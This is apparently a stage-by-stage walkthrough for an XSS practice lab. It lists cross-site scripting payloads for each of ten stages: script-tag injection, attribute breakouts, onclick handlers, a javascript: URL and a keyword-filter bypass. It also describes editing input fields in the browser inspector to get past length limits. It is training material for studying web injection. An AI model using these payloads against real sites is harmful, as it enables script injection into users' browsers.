## Stage #1
**Payload:** `<script>alert(document.domain)</script>`


## Stage #2
**Payload:** `"><script>alert(document.domain)</script>//`


## Stage #3
Go to inspect and change a option (e.g. USA) to `<script>alert(document.domain)</script>`
Then choose this and click search


## Stage #4
Go to inspect. You'll see a hidden input field after the select tag. Make it visible by removing `type`.
Then use this payload in that input field:
```
"><script>alert(document.domain)</script>//
```

## Stage #5
Go to inspect. You will see a input field like this:
```html
<input type="text" name="p1" maxlength="15" size="30" value="">
```
So just delete the maxlength="15" and size="30".
Then use this payload in that input field:
```
"><script>alert(document.domain)</script>//
```

## Stage #6
Use this payload: `" onclick=alert(document.domain)`
Click the search button. Then click the input field again. SOLVED!

## Stage #7
Same as **Stage #6**. Use this payload: `" onclick=alert(document.domain)`

## Stage #8
Use this payload: `javascript:alert(document.domain)'. Then its gonna make an url.
Click that url and the lab is solved.


## Stage #9
Open Console. Then use this: `alert(document.domain)` and execute.


## Stage #10
Since the word `domain` is removed use
```
"><script>alert(document['do'+'main'])</script>
```
